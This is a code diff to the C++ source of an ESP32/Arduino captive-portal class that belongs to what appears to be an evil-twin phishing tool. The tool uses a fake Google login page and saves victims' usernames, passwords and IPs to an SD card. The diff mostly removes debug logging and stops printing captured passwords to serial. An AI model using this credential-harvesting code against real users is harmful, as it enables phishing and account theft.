@@ -286,7 +286,6 @@ static const char GOOGLE_PORTAL_HTML[] PROGMEM = R"rawliteral(
 
 ArduinoCaptivePortal::ArduinoCaptivePortal() {
     strcpy(portalTitle_, "Network Login");
-    Serial.printf("[ArduinoCaptive] Constructor: this=%p\n", (void*)this);
 }
 
 // ============ Accessor implementations (moved from header to avoid ODR issues) ============
@@ -300,8 +299,6 @@ const ArduinoCapturedCredential* ArduinoCaptivePortal::getCredentialsArray() con
 }
 
 std::vector<ArduinoCapturedCredential> ArduinoCaptivePortal::getCredentials() const {
-    Serial.printf("[ArduinoCaptive] getCredentials() this=%p, &credentialCount_=%p, count=%zu\n", 
-                  (void*)this, (void*)&credentialCount_, credentialCount_);
     std::vector<ArduinoCapturedCredential> result;
     for (size_t i = 0; i < credentialCount_; i++) {
         result.push_back(credentialsArray_[i]);
@@ -333,7 +330,7 @@ void ArduinoCaptivePortal::setSSID(const char* ssid) {
     if (ssid) {
         strncpy(currentSSID_, ssid, sizeof(currentSSID_) - 1);
         currentSSID_[sizeof(currentSSID_) - 1] = '\0';
-        Serial.printf("[ArduineCaptive] setSSID called: '%s'\n", currentSSID_);
+        Serial.printf("[ArduinoCaptive] setSSID called: '%s'\n", currentSSID_);
     }
 }
 
@@ -344,7 +341,7 @@ bool ArduinoCaptivePortal::saveCredentialsToSD() {
     }
     
     // Create safe SSID for filename
-    Serial.printf("[ArduineCaptive] saveCredentialsToSD: currentSSID_='%s'\n", currentSSID_);
+    Serial.printf("[ArduinoCaptive] saveCredentialsToSD: currentSSID_='%s'\n", currentSSID_);
     char safeSSID[33];
     strncpy(safeSSID, currentSSID_[0] ? currentSSID_ : "unknown", sizeof(safeSSID) - 1);
     for (char* p = safeSSID; *p; p++) {
@@ -364,7 +361,7 @@ bool ArduinoCaptivePortal::saveCredentialsToSD() {
     // Open file for writing
     File file = SD.open(filepath, FILE_WRITE);
     if (!file) {
-        Serial.printf("[ArduineCaptive] Failed to open: %s\n", filepath);
+        Serial.printf("[ArduinoCaptive] Failed to open: %s\n", filepath);
         return false;
     }
     
@@ -389,7 +386,7 @@ bool ArduinoCaptivePortal::saveCredentialsToSD() {
     // Update registry for live C indicator
     adversary::CaptureRegistry::getInstance().addCredentials(currentSSID_);
     
-    Serial.printf("[ArduineCaptive] Saved %zu credentials to: %s\n", credentialCount_, filepath);
+    Serial.printf("[ArduinoCaptive] Saved %zu credentials to: %s\n", credentialCount_, filepath);
     return true;
 }
 
@@ -568,15 +565,13 @@ void ArduinoCaptivePortal::handleLogin() {
             strncpy(cred.password, webServer_->arg("password").c_str(), sizeof(cred.password) - 1);
             strncpy(cred.clientIP, webServer_->client().remoteIP().toString().c_str(), sizeof(cred.clientIP) - 1);
             cred.timestamp = millis();
-            
-            Serial.printf("[ArduinoCaptive] Before increment: &credentialCount_=%p, credentialCount_=%zu, this=%p\\n", 
-                          (void*)&credentialCount_, credentialCount_, (void*)this);
             credentialCount_++;
-            Serial.printf("[ArduinoCaptive] After increment: credentialCount_=%zu\\n", credentialCount_);
-            
-            Serial.printf("[ArduinoCaptive] CREDENTIAL CAPTURED! User: %s, Pass: %s, IP: %s\\n",
-                          cred.username, cred.password, cred.clientIP);
-            
+
+            // Log the capture event only — never the captured username/password.
+            // These are third-party secrets; printing them to serial would leak
+            // them to anyone with USB access to the device (slice-0035).
+            Serial.printf("[ArduinoCaptive] Credential captured (%zu total)\n", credentialCount_);
+
             if (onCredential_) {
                 onCredential_(cred);
             }
